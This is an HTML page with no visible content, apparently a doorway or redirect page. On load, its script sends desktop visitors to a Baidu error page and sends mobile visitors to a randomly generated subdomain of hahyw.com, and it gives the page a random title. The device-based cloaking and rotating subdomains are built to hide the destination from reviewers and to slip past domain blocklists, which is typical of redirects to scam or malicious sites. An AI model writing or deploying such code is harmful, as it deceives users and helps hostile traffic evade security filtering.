<!DOCTYPE html>
<html>
<head>
<meta http-equiv="Content-Type" content="text="text/html; charset=UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0;">
<meta http-equiv="Cache-Control" content="no-siteapp">
<meta http-equiv="Cache-Control" content="no-transform">
<title></title>
<script type="text/javascript">
function generateRandomTitle(length) {
    var chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
    var result = '';
    for (var i = 0; i < length; i++) {
        result += chars.charAt(Math.floor(Math.random() * chars.length));
    }
    return result;
}

function generateRandomDomain() {
    var length = Math.floor(Math.random() * 4) + 3;
    var chars = 'abcdefghijklmnopqrstuvwxyz0123456789';
    var domain = '';
    
    var hasLetter = false;
    var hasNumber = false;
    
    while (!hasLetter || !hasNumber) {
        domain = '';
        hasLetter = false;
        hasNumber = false;
        
        for (var i = 0; i < length; i++) {
            var char = chars.charAt(Math.floor(Math.random() * chars.length));
            domain += char;
            
            if (char >= 'a' && char <= 'z') {
                hasLetter = true;
            } else if (char >= '0' && char <= '9') {
                hasNumber = true;
            }
        }
    }
    
    return 'https://' + domain + '.hahyw.com';
}

var ua = navigator.userAgent;
var ipad = ua.match(/(iPad).*OS\s([\d_]+)/),
isIphone = ua.match(/(iPhone\sOS)\s([\d_]+)/),
isAndroid = ua.match(/(Android)\s+([\d.]+)/),
ismb = isIphone || ipad || isAndroid;

if(!ismb) {
    window.location.href = "https://www.baidu.com/search/error.html";
} else {
    var randomDomain = generateRandomDomain();
    window.location.href = randomDomain;
}

document.title = generateRandomTitle(4);
</script>
</head>
<body>
</body>
</html>
